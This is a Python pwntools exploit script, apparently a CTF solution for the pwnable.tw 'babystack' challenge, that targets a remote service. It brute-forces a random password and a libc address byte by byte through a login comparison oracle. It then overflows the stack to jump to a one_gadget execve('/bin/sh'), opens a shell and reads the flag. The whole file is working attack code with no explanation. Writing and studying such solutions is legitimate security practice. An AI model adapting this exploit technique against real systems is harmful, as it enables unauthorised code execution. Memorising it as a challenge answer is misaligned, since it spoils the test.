#!/usr/bin/env python3

from pwn import *

exe = ELF("./babystack_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, gdbscript='''
        #    start
        #    ''')
        #input()
    else:
        r = remote("chall.pwnable.tw", 10205)
    return r


def main():
    r = conn()


    ## Stage 1: Leak urandom and libc base
    
    # Leak 16 bytes of urandom
    urandom = b""
    for i in range(16):
        for guess in range(1, 256):
            r.sendlineafter(b">>", b"1"*15)
            byte_value = guess.to_bytes(1, byteorder='big', signed=False)
            r.sendlineafter(b"passowrd :", urandom+byte_value)
            if  b"Login Success !" in r.recvline():
                urandom += byte_value
                r.sendlineafter(b">>", b"1"*15)
                #print(urandom)
                break

    print(b"urandom: " + urandom)
    print(len(urandom))


    


    # Leak libc base
    r.sendafter(b">>", b"1"*8)
    password = urandom + b"\x00"
    password = password.ljust(0x60-0x20, b"A")
    password += urandom
    password += b"1"*8
    r.sendafter(b"passowrd", password)


    r.recvuntil(b"Login Success")


    r.sendafter(b">>", b"3")
    r.sendafter(b"Copy :", b"A"*17)
    r.recvuntil(b"It is magic copy !\n")


    r.sendafter(b">>", b"1"*8)


    leak_libc = b""
    our_test = urandom + b"1"*8
    for i in range(6):
        for guess in range(1, 256):
            r.sendafter(b">>", b"1"*8)
            byte_value = guess.to_bytes(1, byteorder='big', signed=False)
            r.sendlineafter(b"passowrd", our_test+byte_value)
            if  b"Login Success !" in r.recvline():
                leak_libc += byte_value
                our_test += byte_value
                r.sendafter(b">>", b"1"*8)
                #print(urandom)
                break
    #print(leak_libc)
    #input()
    leak_libc = u64(leak_libc+b"\x00\x00")
    libc.address = leak_libc - 0x6ffb4
    print("libc base: " + hex(libc.address))


    ## Stage 2: Using one_gadget to get shell
    

    # 0xf0567 execve("/bin/sh", rsp+0x70, environ)
    # constraints:
    # [rsp+0x70] == NULL
    
    one_gadget = libc.address + 0xf0567 

    r.sendafter(b">>", b"1"*16)
    password = urandom + b"\x00"
    password = password.ljust(0x60-0x20, b"A")
    password += urandom
    password += b"1"*16
    password += b"A"*8 # rbp
    password += p64(one_gadget)
    r.sendafter(b"passowrd", password)

    r.recvuntil(b"Login Success")


    r.sendafter(b">>", b"3")
    r.sendafter(b"Copy :", b"A"*17)
    r.recvuntil(b"It is magic copy !\n")
    r.sendafter(b">>", b"1"*16) # Logout



    # login
    password = urandom + b"\x00"
    r.sendafter(b">>", b"1"*16)
    r.sendafter(b"passowrd", password)
    # good luck pwning :)
    r.sendafter(b">>", b"2")
    r.sendline(b"cat home/babystack/flag")
    r.interactive()


if __name__ == "__main__":
    main()
